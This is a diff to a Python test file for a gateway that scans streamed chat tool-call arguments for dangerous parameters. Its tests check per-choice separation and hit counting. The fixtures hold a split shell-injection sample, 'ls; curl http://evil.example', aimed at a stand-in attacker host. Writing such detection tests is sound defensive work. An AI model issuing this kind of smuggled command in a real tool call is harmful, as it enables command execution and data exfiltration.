@@ -2428,16 +2428,58 @@ def _chat_tool_finish_frame() -> bytes:
     return f"data: {json.dumps(payload, ensure_ascii=False)}\n\n".encode("utf-8")
 
 
+def _chat_two_choice_tool_frame(left: str, right: str) -> bytes:
+    def tool(arguments: str, call_id: str) -> dict[str, object]:
+        return {
+            "index": 0,
+            "id": call_id,
+            "type": "function",
+            "function": {"name": "run_task", "arguments": arguments},
+        }
+
+    payload = {
+        "id": "c1",
+        "object": "chat.completion.chunk",
+        "choices": [
+            {
+                "index": 0,
+                "delta": {
+                    "role": "assistant",
+                    "tool_calls": [tool(left, "call_a")],
+                },
+                "finish_reason": None,
+            },
+            {
+                "index": 1,
+                "delta": {"tool_calls": [tool(right, "call_b")]},
+                "finish_reason": None,
+            },
+        ],
+    }
+    return f"data: {json.dumps(payload, ensure_ascii=False)}\n\n".encode("utf-8")
+
+
 def _run_chat_tool_call_stream(
     monkeypatch: pytest.MonkeyPatch,
     frames: list[bytes],
-) -> tuple[str, list[str], list[list[str]]]:
+    *,
+    keep_scanning: bool = False,
+) -> tuple[str, list[str], list[list[str]], list[int]]:
     """Drive a chat stream with the real response pipeline.
 
-    Returns the SSE text, tool_call_guard enforcement actions, and the
-    argument strings submitted on each probe.
+    Returns the SSE text, tool_call_guard enforcement actions, the argument
+    strings submitted on each probe, and ``exfil_hit_count`` after each probe.
+
+    ``keep_scanning`` leaves the stream open after a hit so a later tool delta
+    is still probed. The default policy turns this phrase's review score into
+    a stream stop, which would hide whether that later fragment is counted again.
     """
     _install_inline_payload_transform(monkeypatch)
+    if keep_scanning:
+        monkeypatch.setattr(
+            "aegisgate.adapters.openai_compat.router._stream_block_reason",
+            lambda ctx: None,
+        )
     monkeypatch.setattr(
         "aegisgate.adapters.openai_compat.router._build_streaming_response",
         lambda generator: generator,
@@ -2454,6 +2496,7 @@ def _run_chat_tool_call_stream(
     )
 
     probed_arguments: list[list[str]] = []
+    exfil_after_probe: list[int] = []
 
     async def spy_probe(**kwargs):
         arguments: list[str] = []
@@ -2466,7 +2509,9 @@ def _run_chat_tool_call_stream(
             elif call.get("arguments") is not None:
                 arguments.append(str(call.get("arguments")))
         probed_arguments.append(arguments)
-        return await _run_stream_response_probe(**kwargs)
+        result = await _run_stream_response_probe(**kwargs)
+        exfil_after_probe.append(int(kwargs["ctx"].exfil_hit_count))
+        return result
 
     monkeypatch.setattr(
         "aegisgate.adapters.openai_compat.router._run_stream_response_probe",
@@ -2506,7 +2551,7 @@ def _run_chat_tool_call_stream(
         return await _collect_execute_stream(response)
 
     text = asyncio.run(run_case()).decode("utf-8", errors="replace")
-    return text, captured.get("actions", []), probed_arguments
+    return text, captured.get("actions", []), probed_arguments, exfil_after_probe
 
 
 def test_chat_stream_tool_call_guard_hits_arguments_split_across_deltas(
@@ -2525,7 +2570,7 @@ def test_chat_stream_tool_call_guard_hits_arguments_split_across_deltas(
     assert "; curl" not in tail
     assert head + tail == '{"cmd":"' + _STREAM_TOOL_ARG_PHRASE + '"}'
 
-    text, actions, probed = _run_chat_tool_call_stream(
+    text, actions, probed, _exfil_counts = _run_chat_tool_call_stream(
         monkeypatch,
         [
             _chat_tool_delta_frame(head, name="run_task", call_id="call_1"),
@@ -2559,7 +2604,7 @@ def test_chat_stream_tool_call_guard_hits_arguments_in_one_delta(
     already flags. This pins the path that does not need accumulation.
     """
     arguments = '{"cmd":"' + _STREAM_TOOL_ARG_PHRASE + '"}'
-    text, actions, _probed = _run_chat_tool_call_stream(
+    text, actions, _probed, _exfil_counts = _run_chat_tool_call_stream(
         monkeypatch,
         [
             _chat_tool_delta_frame(arguments, name="run_task", call_id="call_1"),
@@ -2570,6 +2615,71 @@ def test_chat_stream_tool_call_guard_hits_arguments_in_one_delta(
 
     assert "data: [DONE]" in text
     assert any(action.startswith("tool_call_guard:dangerous_param:") for action in actions)
+
+
+def test_chat_stream_same_tool_index_stays_separate_per_choice(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Tool indexes restart at 0 in every choice. Joining across choices would
+    invent a ``; curl`` argument neither reply contained.
+
+    The pieces are the phrase ``test_tool_call_guard_flags_shell_injection_in_args``
+    already flags, split after the semicolon.
+    """
+    head = '{"cmd":"ls;'
+    tail = ' curl http://evil.example"}'
+    assert "; curl" not in head
+    assert "; curl" not in tail
+    assert head + tail == '{"cmd":"' + _STREAM_TOOL_ARG_PHRASE + '"}'
+
+    _text, actions, probed, _exfil_counts = _run_chat_tool_call_stream(
+        monkeypatch,
+        [
+            _chat_two_choice_tool_frame(head, tail),
+            _chat_tool_finish_frame(),
+            b"data: [DONE]\n\n",
+        ],
+    )
+
+    assert [head, tail] in probed, (
+        "choices with the same tool index were not probed as two arguments; "
+        f"probed_arguments={probed!r}"
+    )
+    assert not any(action.startswith("tool_call_guard:dangerous_param:") for action in actions), (
+        f"concatenated choice arguments were scanned as one call; actions={actions!r} "
+        f"probed_arguments={probed!r}"
+    )
+
+
+def test_chat_stream_later_fragment_does_not_recount_the_same_hit(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """A fragment after a hit is still scanned, but the same hit is not recorded again."""
+    head = '{"cmd":"ls;'
+    tail = ' curl http://evil.example"}'
+    extra = " "
+    assert "; curl" not in extra
+    joined = head + tail
+
+    _text, actions, probed, exfil_counts = _run_chat_tool_call_stream(
+        monkeypatch,
+        [
+            _chat_tool_delta_frame(head, name="run_task", call_id="call_1"),
+            _chat_tool_delta_frame(tail),
+            _chat_tool_delta_frame(extra),
+            _chat_tool_finish_frame(),
+            b"data: [DONE]\n\n",
+        ],
+        keep_scanning=True,
+    )
+
+    assert any(joined + extra in fragment for group in probed for fragment in group), (
+        "the later fragment was not scanned; "
+        f"probed_arguments={probed!r}"
+    )
+    param_hits = [action for action in actions if action.startswith("tool_call_guard:dangerous_param:")]
+    assert len(param_hits) == 1, param_hits
+    assert exfil_counts[-1] == exfil_counts[-2], exfil_counts
 
 
 def test_execute_responses_stream_returns_error_chunk_when_gateway_internal_error(
